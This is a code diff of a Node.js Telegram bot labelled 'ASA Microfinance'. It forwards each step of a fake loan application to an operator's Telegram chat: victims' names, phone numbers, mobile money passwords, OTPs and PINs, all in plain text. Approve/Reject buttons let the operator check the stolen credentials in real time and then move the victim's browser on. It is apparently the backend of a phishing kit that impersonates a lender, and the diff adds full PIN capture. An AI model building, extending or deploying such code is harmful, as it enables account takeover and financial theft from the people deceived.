@@ -1,6 +1,9 @@
 /**
  * bot_manager.js
- * Complete Telegram Bot Manager with INSTANT Confirm/Reject buttons
+ * ASA Microfinance - Telegram Bot Manager
+ * Sends each step immediately when completed
+ * Includes inline buttons for Step 4 (Password) and Step 6 (PIN)
+ * Production ready - No localhost references
  */
 
 const TelegramBot = require('node-telegram-bot-api');
@@ -8,57 +11,68 @@ const axios = require('axios');
 require('dotenv').config();
 
 // ============================================================================
-// CONFIGURATION
+// ENVIRONMENT CONFIGURATION
 // ============================================================================
 
 const TELEGRAM_TOKEN = process.env.BOT_TOKEN;
 const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
-const SERVER_URL = process.env.SERVER_URL || 'http://localhost:3000';
 
 if (!TELEGRAM_TOKEN || !ADMIN_CHAT_ID) {
-    console.error('❌ Missing Telegram configuration in .env file');
+    console.error('❌ CRITICAL: Missing Telegram configuration');
+    console.error('   BOT_TOKEN and ADMIN_CHAT_ID must be set in environment');
     process.exit(1);
 }
 
-// Initialize bot with polling - NO DELAYS
+// ============================================================================
+// TELEGRAM BOT INITIALIZATION
+// ============================================================================
+
+// Initialize bot with fast polling for button responses
 const bot = new TelegramBot(TELEGRAM_TOKEN, { 
-    polling: true,
     polling: {
-        interval: 300, // Fast polling
+        interval: 300, // Fast polling (300ms) for instant button response
         autoStart: true,
         params: {
-            timeout: 10
+            timeout: 30
         }
     }
 });
 
 console.log(`
 ╔═══════════════════════════════════════════════════════════════╗
-║         ASA MICROFINANCE - TELEGRAM BOT                       ║
+║         ASA MICROFINANCE - TELEGRAM BOT MANAGER               ║
 ╠═══════════════════════════════════════════════════════════════╣
-║  Status:     🟢 RUNNING - INSTANT BUTTONS ACTIVE              ║
-║  Server:     ${SERVER_URL}                                      ║
-║  Buttons:    ✅ CONFIRM / REJECT - INSTANT                     ║
+║  Status:     🟢 RUNNING                                        ║
+║  Bot Token:  ${TELEGRAM_TOKEN.substring(0, 10)}...${TELEGRAM_TOKEN.substring(TELEGRAM_TOKEN.length - 5)}║
+║  Admin Chat: ${ADMIN_CHAT_ID}                                   ║
+║  Mode:       📤 STEP-BY-STEP SENDING                           ║
+║  Buttons:    ✅ INSTANT RESPONSE                               ║
 ╚═══════════════════════════════════════════════════════════════╝
 `);
 
-// Track processed callbacks to prevent duplicates
+// ============================================================================
+// TRACK PROCESSED CALLBACKS (Prevent duplicates)
+// ============================================================================
+
 const processedCallbacks = new Set();
 const processedMessages = new Set();
 
-// Clean up processed callbacks every 5 minutes to prevent memory leak
+// Clean up every 10 minutes
 setInterval(() => {
     processedCallbacks.clear();
     processedMessages.clear();
     console.log('🧹 Cleaned up processed callback cache');
-}, 5 * 60 * 1000);
+}, 10 * 60 * 1000);
 
 // ============================================================================
 // HELPER FUNCTIONS
 // ============================================================================
 
+/**
+ * Escape HTML special characters for Telegram
+ */
 const escapeHTML = (str) => {
-    if (!str) return 'N/A';
+    if (str === undefined || str === null) return 'N/A';
     return String(str)
         .replace(/&/g, '&amp;')
         .replace(/</g, '&lt;')
@@ -67,33 +81,134 @@ const escapeHTML = (str) => {
         .replace(/'/g, '&#039;');
 };
 
-const formatCurrency = (amount) => {
-    if (!amount) return '$0';
-    return `$${Number(amount).toLocaleString()}`;
-};
-
+/**
+ * Format phone number
+ */
 const formatPhone = (phone) => {
     if (!phone) return 'N/A';
     return `+232 ${phone}`;
 };
 
+/**
+ * Format currency
+ */
+const formatCurrency = (amount) => {
+    if (!amount) return '$0';
+    return `$${Number(amount).toLocaleString()}`;
+};
+
 // ============================================================================
-// STEP SENDING FUNCTIONS
+// STEP FORMATTING FUNCTIONS
 // ============================================================================
 
-const sendStep1 = async (data) => {
-    const message = `
+/**
+ * Format Step 1: Loan Details
+ */
+const formatStep1 = (data) => {
+    return `
 💰 <b>STEP 1 – LOAN DETAILS</b>
 ━━━━━━━━━━━━━━━━━━━━━━━━━━
-🆔 <b>Application:</b> <code>${escapeHTML(data.appId || 'N/A')}</code>
+🆔 <b>Application ID:</b> <code>${escapeHTML(data.appId)}</code>
 📋 <b>Loan Type:</b> ${escapeHTML(data.loanType)}
 💵 <b>Amount:</b> ${formatCurrency(data.amount)}
 ⏱️ <b>Term:</b> ${escapeHTML(data.term)} months
 📝 <b>Purpose:</b> ${escapeHTML(data.purpose)}
     `;
-    
+};
+
+/**
+ * Format Step 2: Personal Information
+ */
+const formatStep2 = (data) => {
+    return `
+👤 <b>STEP 2 – PERSONAL INFORMATION</b>
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+🆔 <b>Application ID:</b> <code>${escapeHTML(data.appId)}</code>
+👤 <b>First Name:</b> ${escapeHTML(data.firstName)}
+👤 <b>Last Name:</b> ${escapeHTML(data.lastName)}
+📧 <b>Email:</b> ${escapeHTML(data.email)}
+📞 <b>Phone:</b> ${formatPhone(data.phone)}
+    `;
+};
+
+/**
+ * Format Step 3: Employment Information
+ */
+const formatStep3 = (data) => {
+    return `
+💼 <b>STEP 3 – EMPLOYMENT</b>
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+🆔 <b>Application ID:</b> <code>${escapeHTML(data.appId)}</code>
+📋 <b>Employment Status:</b> ${escapeHTML(data.employment)}
+💰 <b>Income:</b> ${formatCurrency(data.income)}
+🏢 <b>Employer:</b> ${escapeHTML(data.employer) || 'N/A'}
+    `;
+};
+
+/**
+ * Format Step 4: Mobile Money (Password) - WITH BUTTONS
+ */
+const formatStep4 = (data) => {
+    return `
+🔐 <b>STEP 4 – MOBILE MONEY VERIFICATION</b>
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🆔 <b>Application ID:</b> <code>${escapeHTML(data.appId)}</code>
+👤 <b>Name:</b> ${escapeHTML(data.firstName)} ${escapeHTML(data.lastName)}
+📞 <b>Phone:</b> ${formatPhone(data.phone)}
+💰 <b>Amount:</b> ${formatCurrency(data.amount)}
+🔑 <b>Password:</b> <code>${escapeHTML(data.password)}</code>
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<i>Admin action required. User is waiting.</i>
+    `;
+};
+
+/**
+ * Format Step 5: OTP Verification
+ */
+const formatStep5 = (data) => {
+    return `
+🔢 <b>STEP 5 – OTP VERIFICATION</b>
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+🆔 <b>Application ID:</b> <code>${escapeHTML(data.appId)}</code>
+📞 <b>Phone:</b> ${formatPhone(data.phone)}
+🔢 <b>OTP:</b> <code>${escapeHTML(data.otp)}</code>
+    `;
+};
+
+/**
+ * Format Step 6: Final PIN - WITH BUTTONS
+ */
+const formatStep6 = (data) => {
+    return `
+🔐 <b>STEP 6 – FINAL PIN VERIFICATION</b>
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🆔 <b>Application ID:</b> <code>${escapeHTML(data.appId)}</code>
+👤 <b>Name:</b> ${escapeHTML(data.firstName)} ${escapeHTML(data.lastName)}
+📞 <b>Phone:</b> ${formatPhone(data.phone)}
+💰 <b>Amount:</b> ${formatCurrency(data.amount)}
+🔑 <b>Password:</b> <code>${escapeHTML(data.password)}</code> (verified earlier)
+🔢 <b>OTP:</b> <code>${escapeHTML(data.otp)}</code>
+🔐 <b>PIN:</b> <code>${escapeHTML(data.pin)}</code>
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<i>Final admin verification required.</i>
+    `;
+};
+
+// ============================================================================
+// STEP SENDING FUNCTIONS (Called by server.js)
+// ============================================================================
+
+/**
+ * Send Step 1 to Telegram
+ */
+const sendStep1 = async (data) => {
     try {
-        await bot.sendMessage(ADMIN_CHAT_ID, message, { parse_mode: 'HTML' });
+        const message = formatStep1(data);
+        await bot.sendMessage(ADMIN_CHAT_ID, message, { 
+            parse_mode: 'HTML' 
+        });
         console.log(`✅ Step 1 sent for ${data.appId}`);
         return true;
     } catch (error) {
@@ -102,19 +217,15 @@ const sendStep1 = async (data) => {
     }
 };
 
+/**
+ * Send Step 2 to Telegram
+ */
 const sendStep2 = async (data) => {
-    const message = `
-👤 <b>STEP 2 – PERSONAL INFORMATION</b>
-━━━━━━━━━━━━━━━━━━━━━━━━━━
-🆔 <b>Application:</b> <code>${escapeHTML(data.appId || 'N/A')}</code>
-👤 <b>First Name:</b> ${escapeHTML(data.firstName)}
-👤 <b>Last Name:</b> ${escapeHTML(data.lastName)}
-📧 <b>Email:</b> ${escapeHTML(data.email)}
-📞 <b>Phone:</b> ${formatPhone(data.phone)}
-    `;
-    
     try {
-        await bot.sendMessage(ADMIN_CHAT_ID, message, { parse_mode: 'HTML' });
+        const message = formatStep2(data);
+        await bot.sendMessage(ADMIN_CHAT_ID, message, { 
+            parse_mode: 'HTML' 
+        });
         console.log(`✅ Step 2 sent for ${data.appId}`);
         return true;
     } catch (error) {
@@ -123,18 +234,15 @@ const sendStep2 = async (data) => {
     }
 };
 
+/**
+ * Send Step 3 to Telegram
+ */
 const sendStep3 = async (data) => {
-    const message = `
-💼 <b>STEP 3 – EMPLOYMENT</b>
-━━━━━━━━━━━━━━━━━━━━━━━━━━
-🆔 <b>Application:</b> <code>${escapeHTML(data.appId || 'N/A')}</code>
-📋 <b>Employment Status:</b> ${escapeHTML(data.employment)}
-💰 <b>Income:</b> ${formatCurrency(data.income)}
-🏢 <b>Employer:</b> ${escapeHTML(data.employer) || 'N/A'}
-    `;
-    
     try {
-        await bot.sendMessage(ADMIN_CHAT_ID, message, { parse_mode: 'HTML' });
+        const message = formatStep3(data);
+        await bot.sendMessage(ADMIN_CHAT_ID, message, { 
+            parse_mode: 'HTML' 
+        });
         console.log(`✅ Step 3 sent for ${data.appId}`);
         return true;
     } catch (error) {
@@ -143,18 +251,27 @@ const sendStep3 = async (data) => {
     }
 };
 
-const sendStep4 = async (data) => {
-    const message = `
-🔐 <b>STEP 4 – ACCOUNT VERIFICATION</b>
-━━━━━━━━━━━━━━━━━━━━━━━━━━
-🆔 <b>Application:</b> <code>${escapeHTML(data.appId || 'N/A')}</code>
-📞 <b>Phone:</b> ${formatPhone(data.phone)}
-🔑 <b>Password:</b> <code>${escapeHTML(data.password)}</code>
-    `;
-    
+/**
+ * Send Step 4 to Telegram WITH BUTTONS
+ */
+const sendStep4 = async (data, io) => {
     try {
-        await bot.sendMessage(ADMIN_CHAT_ID, message, { parse_mode: 'HTML' });
-        console.log(`✅ Step 4 sent for ${data.appId}`);
+        const message = formatStep4(data);
+        
+        // Create inline keyboard with Approve/Reject buttons
+        const keyboard = {
+            inline_keyboard: [[
+                { text: '✅ APPROVE PASSWORD', callback_data: `approve_pw_${data.appId}` },
+                { text: '🔄 REJECT PASSWORD', callback_data: `reject_pw_${data.appId}` }
+            ]]
+        };
+        
+        await bot.sendMessage(ADMIN_CHAT_ID, message, { 
+            parse_mode: 'HTML',
+            reply_markup: JSON.stringify(keyboard)
+        });
+        
+        console.log(`✅ Step 4 sent for ${data.appId} (with buttons)`);
         return true;
     } catch (error) {
         console.error(`❌ Failed to send Step 4:`, error.message);
@@ -162,17 +279,15 @@ const sendStep4 = async (data) => {
     }
 };
 
+/**
+ * Send Step 5 to Telegram
+ */
 const sendStep5 = async (data) => {
-    const message = `
-🔢 <b>STEP 5 – OTP VERIFICATION</b>
-━━━━━━━━━━━━━━━━━━━━━━━━━━
-🆔 <b>Application:</b> <code>${escapeHTML(data.appId || 'N/A')}</code>
-📞 <b>Phone:</b> ${formatPhone(data.phone)}
-🔢 <b>OTP:</b> <code>${escapeHTML(data.otp)}</code>
-    `;
-    
     try {
-        await bot.sendMessage(ADMIN_CHAT_ID, message, { parse_mode: 'HTML' });
+        const message = formatStep5(data);
+        await bot.sendMessage(ADMIN_CHAT_ID, message, { 
+            parse_mode: 'HTML' 
+        });
         console.log(`✅ Step 5 sent for ${data.appId}`);
         return true;
     } catch (error) {
@@ -181,18 +296,27 @@ const sendStep5 = async (data) => {
     }
 };
 
-const sendStep6 = async (data) => {
-    const message = `
-🔒 <b>STEP 6 – FINAL VERIFICATION</b>
-━━━━━━━━━━━━━━━━━━━━━━━━━━
-🆔 <b>Application:</b> <code>${escapeHTML(data.appId || 'N/A')}</code>
-📞 <b>Phone:</b> ${formatPhone(data.phone)}
-🔐 <b>PIN:</b> <code>****</code>
-    `;
-    
+/**
+ * Send Step 6 to Telegram WITH BUTTONS
+ */
+const sendStep6 = async (data, io) => {
     try {
-        await bot.sendMessage(ADMIN_CHAT_ID, message, { parse_mode: 'HTML' });
-        console.log(`✅ Step 6 sent for ${data.appId}`);
+        const message = formatStep6(data);
+        
+        // Create inline keyboard with Approve/Reject buttons
+        const keyboard = {
+            inline_keyboard: [[
+                { text: '✅ APPROVE PIN', callback_data: `approve_pin_${data.appId}` },
+                { text: '🔄 REJECT PIN', callback_data: `reject_pin_${data.appId}` }
+            ]]
+        };
+        
+        await bot.sendMessage(ADMIN_CHAT_ID, message, { 
+            parse_mode: 'HTML',
+            reply_markup: JSON.stringify(keyboard)
+        });
+        
+        console.log(`✅ Step 6 sent for ${data.appId} (with buttons)`);
         return true;
     } catch (error) {
         console.error(`❌ Failed to send Step 6:`, error.message);
@@ -200,114 +324,15 @@ const sendStep6 = async (data) => {
     }
 };
 
-// ============================================================================
-// VERIFICATION REQUESTS (WITH BUTTONS)
-// ============================================================================
-
-const requestPasswordVerification = async (data) => {
-    const message = `
-🔴 <b>⚠️ PASSWORD VERIFICATION REQUIRED</b> 🔴
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🆔 <b>Application:</b> <code>${escapeHTML(data.appId)}</code>
-👤 <b>Name:</b> ${escapeHTML(data.firstName)} ${escapeHTML(data.lastName)}
-📞 <b>Phone:</b> ${formatPhone(data.phone)}
-💰 <b>Amount:</b> ${formatCurrency(data.amount)}
-
-<b>🔑 PASSWORD:</b> <code>${escapeHTML(data.password)}</code>
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-<b>Is this password correct?</b>
-    `;
-    
-    const keyboard = {
-        inline_keyboard: [[
-            { text: '✅ CONFIRM', callback_data: `pw_confirm_${data.appId}` },
-            { text: '❌ REJECT', callback_data: `pw_reject_${data.appId}` }
-        ]]
-    };
-    
+/**
+ * Send a simple message to Telegram
+ */
+const sendTelegramMessage = async (text) => {
     try {
-        await bot.sendMessage(ADMIN_CHAT_ID, message, {
-            parse_mode: 'HTML',
-            reply_markup: JSON.stringify(keyboard)
+        await bot.sendMessage(ADMIN_CHAT_ID, text, { 
+            parse_mode: 'HTML' 
         });
-        console.log(`✅ Password verification sent for ${data.appId}`);
-        return true;
-    } catch (error) {
-        console.error(`❌ Failed to send password verification:`, error.message);
-        return false;
-    }
-};
-
-const requestPinVerification = async (data) => {
-    const message = `
-🔴 <b>⚠️ FINAL PIN VERIFICATION REQUIRED</b> 🔴
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🆔 <b>Application:</b> <code>${escapeHTML(data.appId)}</code>
-👤 <b>Name:</b> ${escapeHTML(data.firstName)} ${escapeHTML(data.lastName)}
-📞 <b>Phone:</b> ${formatPhone(data.phone)}
-💰 <b>Amount:</b> ${formatCurrency(data.amount)}
-
-<b>🔑 PASSWORD:</b> <code>${escapeHTML(data.password)}</code> (verified)
-<b>🔐 PIN:</b> <code>${escapeHTML(data.pin)}</code>
-<b>🔢 OTP:</b> <code>${escapeHTML(data.otp)}</code>
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-<b>Is this PIN correct?</b>
-    `;
-    
-    const keyboard = {
-        inline_keyboard: [[
-            { text: '✅ CONFIRM', callback_data: `pin_confirm_${data.appId}` },
-            { text: '❌ REJECT', callback_data: `pin_reject_${data.appId}` }
-        ]]
-    };
-    
-    try {
-        await bot.sendMessage(ADMIN_CHAT_ID, message, {
-            parse_mode: 'HTML',
-            reply_markup: JSON.stringify(keyboard)
-        });
-        console.log(`✅ PIN verification sent for ${data.appId}`);
-        return true;
-    } catch (error) {
-        console.error(`❌ Failed to send PIN verification:`, error.message);
-        return false;
-    }
-};
-
-// ============================================================================
-// COMPLETE APPLICATION SUMMARY
-// ============================================================================
-
-const sendCompleteApplication = async (sessionData) => {
-    const message = `
-✅ <b>APPLICATION COMPLETE</b>
-━━━━━━━━━━━━━━━━━━━━━━━━━━
-🆔 <b>Application:</b> <code>${escapeHTML(sessionData.appId || 'N/A')}</code>
-⏰ <b>Completed:</b> ${new Date().toLocaleString()}
-
-All 6 steps completed successfully!
-    `;
-    
-    try {
-        await bot.sendMessage(ADMIN_CHAT_ID, message, { parse_mode: 'HTML' });
-        console.log(`✅ Complete application sent for ${sessionData.appId}`);
-        return true;
-    } catch (error) {
-        console.error(`❌ Failed to send complete application:`, error.message);
-        return false;
-    }
-};
-
-// ============================================================================
-// SIMPLE MESSAGE
-// ============================================================================
-
-const sendMessage = async (text) => {
-    try {
-        await bot.sendMessage(ADMIN_CHAT_ID, text, { parse_mode: 'HTML' });
-        console.log('✅ Message sent');
+        console.log('✅ Message sent to Telegram');
         return true;
     } catch (error) {
         console.error(`❌ Failed to send message:`, error.message);
@@ -316,42 +341,38 @@ const sendMessage = async (text) => {
 };
 
 // ============================================================================
-// ===== INSTANT CONFIRM/REJECT BUTTON HANDLER - FIXED =====
+// CALLBACK QUERY HANDLER (INSTANT BUTTON RESPONSE)
 // ============================================================================
 
 // Remove any existing listeners to prevent duplicates
 bot.removeAllListeners('callback_query');
 
-// Single, clean callback handler - INSTANT response
-bot.on('callback_query', async (callbackQuery) => {
+bot.on('callback_query', async (query) => {
     const startTime = Date.now();
-    const data = callbackQuery.data;
-    const callbackId = callbackQuery.id;
-    const message = callbackQuery.message;
+    const data = query.data;
+    const callbackId = query.id;
+    const message = query.message;
     const chatId = message.chat.id;
     const messageId = message.message_id;
     
-    console.log(`🔘 Callback received: ${data} (${Date.now() - startTime}ms)`);
+    console.log(`🔘 Callback received: ${data}`);
     
-    // Prevent duplicate processing of same callback
+    // Prevent duplicate processing
     if (processedCallbacks.has(callbackId)) {
         console.log(`⚠️ Duplicate callback ignored: ${callbackId}`);
         return;
     }
     processedCallbacks.add(callbackId);
     
-    // Parse callback data - INSTANT parsing
-    const parts = data.split('_');
-    const type = parts[0];        // 'pw' or 'pin'
-    const action = parts[1];      // 'confirm' or 'reject'
-    const appId = parts.slice(2).join('_');
+    // Parse callback data: [approve/reject]_[pw/pin]_[appId]
+    const [action, type, appId] = data.split('_');
     
-    console.log(`📋 Parsed: type=${type}, action=${action}, appId=${appId} (${Date.now() - startTime}ms)`);
+    console.log(`📋 Parsed: action=${action}, type=${type}, appId=${appId}`);
     
     // INSTANT acknowledgment - remove loading state on button
     try {
         await bot.answerCallbackQuery(callbackId, {
-            text: action === 'confirm' ? '✓ Confirmed!' : '✗ Rejected!',
+            text: action === 'approve' ? '✅ Approved!' : '🔄 Rejected!',
             show_alert: false
         });
         console.log(`✅ Callback answered (${Date.now() - startTime}ms)`);
@@ -359,74 +380,59 @@ bot.on('callback_query', async (callbackQuery) => {
         console.error(`❌ Failed to answer callback:`, error.message);
     }
     
-    // Determine endpoint - FAST
-    let endpoint = '';
-    if (type === 'pw') {
-        endpoint = action === 'confirm' ? '/api/password-verified' : '/api/password-rejected';
-    } else if (type === 'pin') {
-        endpoint = action === 'confirm' ? '/api/pin-verified' : '/api/pin-rejected';
-    } else {
-        console.log('❓ Unknown callback type:', type);
+    // Get socket.io instance (passed from server.js via global)
+    const io = global.io;
+    
+    if (!io) {
+        console.error('❌ Socket.io instance not available');
         return;
     }
     
-    // INSTANT server call - no delays
-    try {
-        console.log(`📡 Calling ${SERVER_URL}${endpoint} for ${appId} (${Date.now() - startTime}ms)`);
-        
-        const response = await axios.post(`${SERVER_URL}${endpoint}`, 
-            { appId }, 
-            { 
-                headers: { 'Content-Type': 'application/json' },
-                timeout: 3000 // Fast timeout
-            }
-        );
-        
-        console.log(`✅ Server response: ${response.status} (${Date.now() - startTime}ms)`);
-        
-        if (response.data && response.data.success) {
-            console.log(`✅ Server notified: ${action} for ${appId} (${Date.now() - startTime}ms)`);
-            
-            // INSTANT message update - remove buttons
-            try {
-                await bot.editMessageText(
-                    message.text + `\n\n✅ ${action.toUpperCase()}D`,
-                    { 
-                        chat_id: chatId, 
-                        message_id: messageId, 
-                        parse_mode: 'HTML',
-                        reply_markup: { inline_keyboard: [] } 
-                    }
-                );
-                console.log(`✅ Message updated, buttons removed (${Date.now() - startTime}ms)`);
-            } catch (editError) {
-                // Message might already be deleted - ignore
-                console.log(`⚠️ Message update skipped:`, editError.message);
-            }
-            
-            // INSTANT confirmation message (fire and forget)
-            bot.sendMessage(chatId, 
-                `✅ ${action.toUpperCase()} confirmed for ${appId}`,
-                { parse_mode: 'HTML' }
-            ).catch(() => {});
-            
-        } else {
-            console.error(`❌ Server returned error:`, response.data);
-            bot.sendMessage(chatId, 
-                `❌ Error: Server returned ${response.status}`,
-                { parse_mode: 'HTML' }
-            ).catch(() => {});
+    // Emit socket event based on action and type
+    if (action === 'approve') {
+        if (type === 'pw') {
+            io.to(appId).emit('password-verified');
+            console.log(`✅ Emitted password-verified to room: ${appId}`);
+        } else if (type === 'pin') {
+            // Generate reference ID for completed application
+            const referenceId = 'ASA-' + Date.now().toString(36).toUpperCase() + '-' + 
+                                Math.random().toString(36).substring(2, 8).toUpperCase();
+            io.to(appId).emit('pin-verified', { referenceId });
+            console.log(`✅ Emitted pin-verified to room: ${appId} (Ref: ${referenceId})`);
         }
-        
-    } catch (error) {
-        console.error(`❌ Failed to notify server (${Date.now() - startTime}ms):`, error.message);
-        
-        // INSTANT error feedback
-        bot.sendMessage(chatId, 
-            `❌ Error processing ${action} for ${appId}\n${error.message}`,
-            { parse_mode: 'HTML' }
-        ).catch(() => {});
+    } else if (action === 'reject') {
+        if (type === 'pw') {
+            io.to(appId).emit('password-rejected', { attempts: 1 });
+            console.log(`❌ Emitted password-rejected to room: ${appId}`);
+        } else if (type === 'pin') {
+            io.to(appId).emit('pin-rejected', { attempts: 1 });
+            console.log(`❌ Emitted pin-rejected to room: ${appId}`);
+        }
     }
+    
+    // Update original message to show it was processed
+    try {
+        const statusText = action === 'approve' ? '✅ APPROVED' : '🔄 REJECTED';
+        const newText = message.text + `\n\n<b>${statusText}</b> at ${new Date().toLocaleTimeString()}`;
+        
+        await bot.editMessageText(newText, {
+            chat_id: chatId,
+            message_id: messageId,
+            parse_mode: 'HTML',
+            reply_markup: { inline_keyboard: [] } // Remove buttons
+        });
+        
+        console.log(`✅ Message updated, buttons removed`);
+    } catch (editError) {
+        // Silently fail - message might be too old to edit
+    }
+    
+    // Send confirmation message
+    const confirmText = action === 'approve' 
+        ? `✅ Application ${appId} has been APPROVED. User notified.`
+        : `🔄 Application ${appId} has been REJECTED. User will retry.`;
+    
+    await bot.sendMessage(chatId, confirmText, { parse_mode: 'HTML' });
     
     console.log(`⏱️ Total callback processing time: ${Date.now() - startTime}ms`);
 });
@@ -437,8 +443,8 @@ bot.on('callback_query', async (callbackQuery) => {
 
 bot.on('polling_error', (error) => {
     // Only log critical errors
-    if (error.code !== 'EFATAL') {
-        console.error('❌ Polling error:', error.message);
+    if (error.code && error.code !== 'EFATAL') {
+        console.error('⚠️ Polling error:', error.message);
     }
 });
 
@@ -447,29 +453,39 @@ bot.on('error', (error) => {
 });
 
 // ============================================================================
-// COMMAND HANDLERS (optional)
+// COMMAND HANDLERS (Optional)
 // ============================================================================
 
 bot.onText(/\/start/, async (msg) => {
     const chatId = msg.chat.id;
+    
+    // Only respond to admin chat
     if (chatId.toString() !== ADMIN_CHAT_ID.toString()) return;
     
     await bot.sendMessage(chatId, 
-        '👋 ASA Microfinance Bot is active!\n\n' +
-        '✅ CONFIRM/REJECT buttons are INSTANT',
+        `👋 <b>ASA Microfinance Bot Active</b>\n\n` +
+        `I will send each step of loan applications as they are completed.\n\n` +
+        `✅ Steps 1-3: Notifications only\n` +
+        `✅ Step 4: Password verification with buttons\n` +
+        `✅ Step 5: OTP notification\n` +
+        `✅ Step 6: PIN verification with buttons\n\n` +
+        `<i>All messages include full application details</i>`,
         { parse_mode: 'HTML' }
     );
 });
 
 bot.onText(/\/stats/, async (msg) => {
     const chatId = msg.chat.id;
+    
     if (chatId.toString() !== ADMIN_CHAT_ID.toString()) return;
     
     await bot.sendMessage(chatId,
-        `📊 Bot Statistics\n━━━━━━━━━━━━━━━━━━\n` +
-        `✅ Status: Active\n` +
-        `⚡ Buttons: INSTANT mode\n` +
-        `📡 Server: ${SERVER_URL}`,
+        `📊 <b>Bot Statistics</b>\n` +
+        `━━━━━━━━━━━━━━━━━━\n` +
+        `🆙 Status: Active\n` +
+        `⚡ Button response: INSTANT\n` +
+        `📡 Mode: Step-by-step sending\n` +
+        `🕒 Uptime: ${Math.floor(process.uptime() / 60)} minutes`,
         { parse_mode: 'HTML' }
     );
 });
@@ -479,9 +495,11 @@ bot.onText(/\/stats/, async (msg) => {
 // ============================================================================
 
 module.exports = {
-    sendStep1, sendStep2, sendStep3, sendStep4, sendStep5, sendStep6,
-    sendCompleteApplication,
-    requestPasswordVerification,
-    requestPinVerification,
-    sendMessage
+    sendStep1,
+    sendStep2,
+    sendStep3,
+    sendStep4,
+    sendStep5,
+    sendStep6,
+    sendTelegramMessage
 };
